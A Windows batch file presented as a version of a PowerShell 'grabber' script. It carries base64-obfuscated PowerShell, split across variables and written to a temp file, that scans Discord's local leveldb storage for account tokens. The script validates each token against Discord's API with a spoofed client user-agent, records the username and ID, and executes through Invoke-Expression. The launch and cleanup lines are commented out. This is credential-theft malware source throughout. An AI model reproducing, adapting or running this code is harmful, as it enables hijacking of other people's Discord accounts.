@echo off
REM Batch file version of psh-grabber-min.ps1
REM http://f1sk.xyz // http://jayy.xyz <3


REM Sets the varibles containg the powershell code - the powershell code contains code to decode the actual script
REM We have to split the string up into multiple vars, otherwise the string will be too long.

set p1="$uwu = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JHNjcmlwdCA9ICcjIGh0dHA6Ly9mMXNrLnh5eiAvLyBodHRwOi8vamF5eS54eXrCqCMgPDPCqCRpZD0iIsKoJHRtcElEPSIiwqgkdXNlcj0iIsKoJHRtcFRhZz0iIsKoJHBvc3NpYmxlVG9rZW5zID0gQCgpwqgkZGlzY29yZFBhdGggPSAkZW52OkFQUERBVEErIlxkaXNjb3JkIsKoJHN0b3JhZ2VQYXRoID0gIlxMb2NhbCBTdG9yYWdlXGxldmVsZGIiwqgkc3RhYmxlID0gJGRpc2NvcmRQYXRoKyRzdG9yYWdlUGF0aMKoJGNhbmFyeSA9ICRkaXNjb3JkUGF0aCsiY2FuYXJ5Iiskc3RvcmFnZVBhdGjCqCRwdGIgPSAkZGlzY29yZFBhdGgrInB0YiIrJHN0b3JhZ2VQYXRowqhpZiAoIFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHN0YWJsZSApIHvCqFNldC1Mb2NhdGlvbiAkc3RhYmxlwqgkZmlsZXMgPSBAKEdldC1DaGlsZEl0ZW0gKi5sZGIpwqhGb3JlYWNoICgkZmlsZSBpbiAkZmlsZXMpwqh7wqgkbWZhID0gU2VsZWN0LVN0cmluZyAtUGF0aCAkZmlsZSAtUGF0dGVybiAibWZhXC5bYS16QS1aMC05Xy1dezg0fSIgLUFsbE1hdGNoZXMgfCBGb3JFYWNoLU9iamVjdCB7ICRfLk1hdGNoZXMgfSB8IEZvckVhY2gtT2JqZWN0IHsgJF8uVmFsdWUgfcKoaWYgKCRtZmEubGVuZ3RoIC1ndCAxKSB7wqh0cnkge8KoJHIgPSBJbnZva2UtV2ViUmVxdWVzdCBodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUgYMKoLUhlYWRlcnMgQHsiQWNjZXB0IiA9ICJhcHBsaWNhdGlvbi9qc29uIjsiVXNlci1BZ2VudCIgPSAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMC4wLjMwOCBDaHJvbWUvNzguMC4zOTA0LjEzMCBFbGVjdHJvbi83LjMuMiBTYWZhcmkvNTM3LjM2IjsgIkF1dGhvcml6YXRpb24iID0gJG1mYX0gLVVzZUJhc2ljUGFyc2luZyAtRVYgRXJyIC1FQSBTaWxlbnRseUNvbnRpbnVlwqh9IGNhdGNoIHvCqCMgJF8uRXhjZXB0aW9uLlJlc3BvbnNlLlN0YXR1c0NvZGUuVmFsdWVfX8KofcKofcKoaWYgKCRyLnN0YXR1c0NvZGUgLWVxICIyMDAiKcKoe8KoJHRtcElEID0gJHIuY29udGVudCB8IENvbnZlcnRGcm9tLUpzb24gfCBTZWxlY3QtT2JqZWN0IGlkwqgkdG1wVXNlcm5hbWUgPSAkci5jb250ZW50IHwgQ29udmVydEZyb20tSnNvbiB8IFNlbGVjdC1PYmplY3QgdXNlcm5hbWXCqCR0bXBUYWcgPSAkci5jb250ZW50IHwgQ29udmVydEZyb20tSnNvbiB8IFNlbGVjdC1PYmplY3QgZGlzY3JpbWluYXRvcsKoJHVzZXIgPSAkdG1wVXNlcm5hbWUudXNlcm5hbWUrIiMiKyR0bXBUYWcuZGlzY3JpbWluYXRvcsKoJGlkID0gJHRtcElELmlkwqgkcG9zc2libGVUb2tlbnMgKz0gQChbcHNjdXN0b21vYmplY3RdQHtUeXBlPSJNRkEiO0xvY2F0aW9uPSJEaXNjb3JkU3RhYmxlIjtUb2tlbj0kbWZhO1VzZXI9JHVzZXI7SUQ9JGlkfSnCqH0gZWxzZSB7wqh9wqgkaWQ9IiLCqCR0bXBJRD0iIsKoJHVzZXI9IiLCqCRyPSIiwqgkdGtuID0gU2VsZWN0LVN0cmluZyAtUGF0aCAkZmlsZSAtUGF0dGVybiAiW2EtekEtWjAtOV8tXXsyNH1cLlthLXpBLVowLTlfLV17Nn1cLlthLXpBLVowLTlfLV17Mjd9IiAtQWxsTWF0Y2hlcyB8IEZvckVhY2gtT2JqZWN0IHsgJF8uTWF0Y2hlcyB9IHwgRm9yRWFjaC1PYmplY3QgeyAkXy5WYWx1ZSB9wqhpZiAoJHRrbi5sZW5ndGggLWd0IDIpIHvCqHRyeSB7wqgkciA9IEludm9rZS1XZWJSZXF1ZXN0IGh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZSBgwqgtSGVhZGVycyBAeyJBY2NlcHQiID0gImFwcGxpY2F0aW9uL2pzb24iOyJVc2VyLUFnZW50IiA9ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXT1c2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgZGlzY29yZC8wLjAuMzA4IENocm9tZS83OC4wLjM5MDQuMTMwIEVsZWN0cm9uLzcuMy4yIFNhZmFyaS81MzcuMzYiOyAiQXV0aG9yaXphdGlvbiIgPSAkdGtufSAtVXNlQmFzaWNQYXJzaW5nIC1FViBFcnIgLUVBIFNpbGVudGx5Q29udGludWXCqH0gY2F0Y2gge8KoIyAkXy5FeGNlcHRpb24uUmVzcG9uc2UuU3RhdHVzQ29kZS5WYWx1ZV9fwqh9wqh9wqhpZiAoJHIuc3RhdHVzQ29kZSAtZXEgIjIwMCIpwqh7wqgkdG1wSUQgPSAkci5jb250ZW50IHwgQ29udmVydEZyb20tSnNvbiB8IFNlbGVjdC1PYmplY3QgaWTCqCR0bXBVc2VybmFtZSA9ICRyLmNvbnRlbnQgfCBDb252ZXJ0RnJvbS1Kc29uIHwgU2VsZWN0LU9iamVjdCB1c2VybmFtZcKoJHRtcFRhZyA9ICRyLmNvbnRlbnQgfCBDb252ZXJ0RnJvbS1Kc29uIHwgU2VsZWN0LU9iamVjdCBkaXNjcmltaW5hdG9ywqgkdXNlciA9ICR0bXBVc2VybmFtZS51c2VybmFtZSsiIyIrJHRtcFRhZy5kaXNjcmltaW5hdG9ywqgkaWQgPSAkdG1wSUQuaWTCqCRwb3NzaWJsZVRva2VucyArPSBAKFtwc2N1c3RvbW9iamVjdF1Ae1R5cGU9Ik5PIE1GQSI7TG9jYXRpb249IkRpc2NvcmRTdGFibGUiO1Rva2VuPSR0a247VXNlcj0kdXNlcjtJRD0kaWR9KcKoJHI9IiLCqCRpZD0iIsKoJHRtcElEPSIiwqgkdXNlcj0iIsKofSBlbHNlIHvCqCRyPSIiwqgkaWQ9IiLCqCR0bXBJRD0iIsKoJHVzZXI9IiLCqH3CqH3CqH3CqGlmICggVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkY2FuYXJ5ICkge8KoU2V0LUxvY2F0aW9uICRjYW5hcnnCqCRmaWxlcyA9IEAoR2V0LUNoaWxkSXRlbSAqLmxkYinCqEZvcmVhY2ggKCRmaWxlIGluICRmaWxlcynCqHvCqCRtZmEgPSBTZWxlY3QtU3RyaW5nIC1QYXRoICRmaWxlIC1QYXR0ZXJuICJtZmFcLlthLXpBLVowLTlfLV17ODR9IiAtQWxsTWF0Y2hlcyB8IEZvckVhY2gtT2JqZWN0IHsgJF8uTWF0Y2hlcyB9IHwgRm9yRWFjaC1PYmplY3QgeyAkXy5WYWx1ZSB9wqhpZiAoJG1mYS5sZW5ndGggLWd0IDEpIHvCqHRyeSB7wqgkciA9IEludm9rZS1XZWJSZXF1ZXN0IGh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZSBgwqgtSGVhZGVycyBAeyJBY2NlcHQiID0gImFwcGxpY2F0aW9uL2pzb24iOyJVc2VyLUFnZW50IiA9ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXT1c2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgZGlzY29yZC8wLjAuMzA4IENocm9tZS83OC4wLjM5MDQuMTMwIEVsZWN0cm9uLzcuMy4yIFNhZmFyaS81MzcuMzYiOyAiQXV0aG9yaXphdGlvbiIgPSAkbWZhfSAtVXNlQmFzaWNQYXJzaW5nIC1FViBFcnIgLUVBIFNpbGVudGx5Q29udGludWXCqH0gY2F0Y2gge8KoIyAkXy5FeGNlcHRpb24uUmVzcG9uc2UuU3RhdHVzQ29kZS5WYWx1ZV9fwqh9wqh9wqhpZiAoJHIuc3RhdHVzQ29kZSAtZXEgIjIwMCIpwqh7wqgkdG1wSUQgPSAkci5jb250ZW50IHwgQ29udmVydEZyb20tSnNvbiB8IFNlbGVjdC1PYmplY3QgaWTCqCR0bXBVc2VybmFtZSA9ICRyLmNvbnRlbnQgfCBDb252ZXJ0RnJvbS1Kc29uIHwgU2VsZWN0LU9iamVjdCB1c2VybmFtZcKoJHRtcFRhZyA9ICRyLmNvbnRlbnQgfCBDb252ZXJ0RnJvbS1Kc29uIHwgU2VsZWN0LU9iamVjdCBkaXNjcmltaW5hdG9ywqgkdXNlciA9ICR0bXBVc2VybmFtZS51c2VybmFtZSsiIyIrJHRtcFRhZy5kaXNjcmltaW5hdG9ywqgkaWQgPSAkdG1wSUQuaWTCqCRwb3NzaWJsZVRva2VucyArPSBAKFtwc2N1c3RvbW9iamVjdF1Ae1R5cGU9Ik1GQSI7TG9jYXRpb249IkRpc2NvcmRDYW5hcnkiO1Rva2VuPSRtZmE7VXNlcj0kdXNlcjtJRD0kaWR9KcKoJHI9IiLCqCRpZD0iIsKoJHRtcElEPSIiwqgkdXNlcj0iIsKofSBlbHNlIHvCqCRyPSIiwqgkaWQ9IiLCqCR0bXBJRD0iIsKoJHVzZXI9IiLCqH3CqCR0a24gPSBTZWxlY3QtU3RyaW5nIC1QYXRoICRmaWxlIC1QYXR0ZXJuICJbYS16QS1aMC05Xy1dezI0fVwuW2EtekEtWjAtOV8tXXs2fVwuW2EtekEtWjAtOV8tXXsyN30iIC1BbGxNYXRjaGVzIHwgRm9yRWFjaC1PYmplY3QgeyAkXy5NYXRjaGVzIH0gfCBGb3JFYWNoLU9iamVjdCB7ICRfLlZhbHVlIH3CqGlmICgkdGtuLmxlbmd0aCAtZ3QgMikge8KodHJ5IHvCqCRyID0gSW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lIGDCqC1IZWFkZXJzIEB7IkFjY2VwdCIgPSAiYXBwbGljYXRpb24vanNvbiI7IlVzZXItQWdlbnQiID0gIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdPVzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBkaXNjb3JkLzAuMC4zMDggQ2hyb21lLzc4LjAuMzkwNC4xMzAgRWxlY3Ryb24vNy4zLjIgU2FmYXJpLzUzNy4zNiI7ICJBdXRob3JpemF0aW9uIiA9ICR0a259IC1Vc2VCYXNpY1BhcnNpbmcgLUVWIEVyciAtRUEgU2lsZW50bHlDb250aW51ZcKofSBjYXRjaCB7wqgjICRfLkV4Y2VwdGlvbi5SZXNwb25zZS5TdGF0dXNDb2RlLlZhbHVlX1/CqH3CqH3CqGlmICgkci5zdGF0dXNDb2RlIC1lcSAiMjAwIinCqHvCqCR0bXBJRCA9ICRyLmNvbnRlbnQgfCBDb252ZXJ0RnJvbS1Kc29uIHwgU2VsZWN0LU9iamVjdCBpZMKoJHRtcFVzZXJuYW1lID0gJHIuY29udGVudCB8IENvbnZ"
set p2p5="ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXT1c2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgZGlzY29yZC8wLjAuMzA4IENocm9tZS83OC4wLjM5MDQuMTMwIEVsZWN0cm9uLzcuMy4yIFNhZmFyaS81MzcuMzYiOyAiQXV0aG9yaXphdGlvbiIgPSAkbWZhfSAtVXNlQmFzaWNQYXJzaW5nIC1FViBFcnIgLUVBIFNpbGVudGx5Q29udGludWXCqH0gY2F0Y2gge8KoIyAkXy5FeGNlcHRpb24uUmVzcG9uc2UuU3RhdHVzQ29kZS5WYWx1ZV9fwqh9wqh9wqhpZiAoJHIuc3RhdHVzQ29kZSAtZXEgIjIwMCIpwqh7wqgkdG1wSUQgPSAkci5jb250ZW50IHwgQ29udmVydEZyb20tSnNvbiB8IFNlbGVjdC1PYmplY3QgaWTCqCR0bXBVc2VybmFtZSA9ICRyLmNvbnRlbnQgfCBDb252ZXJ0RnJvbS1Kc29uIHwgU2VsZWN0LU9iamVjdCB1c2VybmFtZcKoJHRtcFRhZyA9ICRyLmNvbnRlbnQgfCBDb252ZXJ0RnJvbS1Kc29uIHwgU2VsZWN0LU9iamVjdCBkaXNjcmltaW5hdG9ywqgkdXNlciA9ICR0bXBVc2VybmFtZS51c2VybmFtZSsiIyIrJHRtcFRhZy5kaXNjcmltaW5hdG9ywqgkaWQgPSAkdG1wSUQuaWTCqCRwb3NzaWJsZVRva2VucyArPSBAKFtwc2N1c3RvbW9iamVjdF1Ae1R5cGU9Ik1GQSI7TG9jYXRpb249IkRpc2NvcmRDYW5hcnkiO1Rva2VuPSRtZmE7VXNlcj0kdXNlcjtJRD0kaWR9KcKoJHI9IiLCqCRpZD0iIsKoJHRtcElEPSIiwqgkdXNlcj0iIsKofSBlbHNlIHvCqCRyPSIiwqgkaWQ9IiLCqCR0bXBJRD0iIsKoJHVzZXI9IiLCq"

set p3="H3CqCR0a24gPSBTZWxlY3QtU3RyaW5nIC1QYXRoICRmaWxlIC1QYXR0ZXJuICJbYS16QS1aMC05Xy1dezI0fVwuW2EtekEtWjAtOV8tXXs2fVwuW2EtekEtWjAtOV8tXXsyN30iIC1BbGxNYXRjaGVzIHwgRm9yRWFjaC1PYmplY3QgeyAkXy5NYXRjaGVzIH0gfCBGb3JFYWNoLU9iamVjdCB7ICRfLlZhbHVlIH3CqGlmICgkdGtuLmxlbmd0aCAtZ3QgMikge8KodHJ5IHvCqCRyID0gSW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lIGDCqC1IZWFkZXJzIEB7IkFjY2VwdCIgPSAiYXBwbGljYXRpb24vanNvbiI7IlVzZXItQWdlbnQiID0gIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdPVzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBkaXNjb3JkLzAuMC4zMDggQ2hyb21lLzc4LjAuMzkwNC4xMzAgRWxlY3Ryb24vNy4zLjIgU2FmYXJpLzUzNy4zNiI7ICJBdXRob3JpemF0aW9uIiA9ICR0a259IC1Vc2VCYXNpY1BhcnNpbmcgLUVWIEVyciAtRUEgU2lsZW50bHlDb250aW51ZcKofSBjYXRjaCB7wqgjICRfLkV4Y2VwdGlvbi5SZXNwb25zZS5TdGF0dXNDb2RlLlZhbHVlX1/CqH3CqH3CqGlmICgkci5zdGF0dXNDb2RlIC1lcSAiMjAwIinCqHvCqCR0bXBJRCA9ICRyLmNvbnRlbnQgfCBDb252ZXJ0RnJvbS1Kc29uIHwgU2VsZWN0LU9iamVjdCBpZMKoJHRtcFVzZXJuYW1lID0gJHIuY29udGVudCB8IENvbnZlcnRGcm9tLUpzb24gfCBTZWxlY3QtT2JqZWN0IHVzZXJuYW1lwqgkdG1wVGFnID0gJHIuY29udGVudCB"

set p3p5="8IENvbnZlcnRGcm9tLUpzb24gfCBTZWxlY3QtT2JqZWN0IGRpc2NyaW1pbmF0b3LCqCR1c2VyID0gJHRtcFVzZXJuYW1lLnVzZXJuYW1lKyIjIiskdG1wVGFnLmRpc2NyaW1pbmF0b3LCqCRpZCA9ICR0bXBJRC5pZMKoJHBvc3NpYmxlVG9rZW5zICs9IEAoW3BzY3VzdG9tb2JqZWN0XUB7VHlwZT0iTk8gTUZBIjtMb2NhdGlvbj0iRGlzY29yZENhbmFyeSI7VG9rZW49JHRrbjtVc2VyPSR1c2VyO0lEPSRpZH0pwqgkaWQ9IiLCqCRyPSIiwqgkdG1wSUQ9IiLCqCR1c2VyPSIiwqh9IGVsc2Uge8KoJGlkID0gIiLCqH3CqH3CqH3CqCRpZD0iIsKoJHRtcElEPSIiwqgkdXNlcj0iIsKoJHRtcFRhZz0iIsKoV3JpdGUtT3V0cHV0ICRwb3NzaWJsZVRva2Vucyc7IEludm9rZS1FeHByZXNzaW9uICRzY3JpcHQucmVwbGFjZSgiwqgiLCJgbiIp"

set p4="')); Invoke-Expression $uwu"


REM Output the varibles to a temp file named "e" - We're using this method instead of echo to avoid any line breaks.

<NUL set /p=%p1%>>e
<NUL set /p="lcnRGcm9tLUpzb24gfCBTZWxlY3QtT2JqZWN0IHVzZXJuYW1lwqgkdG1wVGFnID0gJHIuY29udGVudCB8IENvbnZlcnRGcm9tLUpzb24gfCBTZWxlY3QtT2JqZWN0IGRpc2NyaW1pbmF0b3LCqCR1c2VyID0gJHRtcFVzZXJuYW1lLnVzZXJuYW1lKyIjIiskdG1wVGFnLmRpc2NyaW1pbmF0b3LCqCRpZCA9ICR0bXBJRC5pZMKoJHBvc3NpYmxlVG9rZW5zICs9IEAoW3BzY3VzdG9tb2JqZWN0XUB7VHlwZT0iTk8gTUZBIjtMb2NhdGlvbj0iRGlzY29yZENhbmFyeSI7VG9rZW49JHRrbjtVc2VyPSR1c2VyO0lEPSRpZH0pwqgkaWQ9IiLCqCRyPSIiwqgkdG1wSUQ9IiLCqCR1c2VyPSIiwqh9IGVsc2Uge8KoJGlkID0gIiLCqH3CqH3CqH3CqGlmICggVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkcHRiICkge8KoU2V0LUxvY2F0aW9uICRwdGLCqCRmaWxlcyA9IEAoR2V0LUNoaWxkSXRlbSAqLmxkYinCqEZvcmVhY2ggKCRmaWxlIGluICRmaWxlcynCqHvCqCRtZmEgPSBTZWxlY3QtU3RyaW5nIC1QYXRoICRmaWxlIC1QYXR0ZXJuICJtZmFcLlthLXpBLVowLTlfLV17ODR9IiAtQWxsTWF0Y2hlcyB8IEZvckVhY2gtT2JqZWN0IHsgJF8uTWF0Y2hlcyB9IHwgRm9yRWFjaC1PYmplY3QgeyAkXy5WYWx1ZSB9wqhpZiAoJG1mYS5sZW5ndGggLWd0IDEpIHvCqHRyeSB7wqgkciA9IEludm9rZS1XZWJSZXF1ZXN0IGh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZSBgwqgtSGVhZGVycyBAeyJBY2NlcHQiID0gImFwcGxpY2F0aW9uL2pzb24iOyJVc2VyLUFnZW50IiA9ICJNb3">>e
<NUL set /p=%p2p5%>>e
<NUL set /p=%p3%>>e
<NUL set /p=%p3p5%>>e
<NUL set /p=%p4%>>e

REM Make powershell run the code stored in "e"

REM powershell.exe /C "Get-Content -LiteralPath '%cd%\e' | Invoke-Expression"

REM Delete the file "e" after it isnt used anymore

REM del e

REM Pause so that the user can see the output.

pause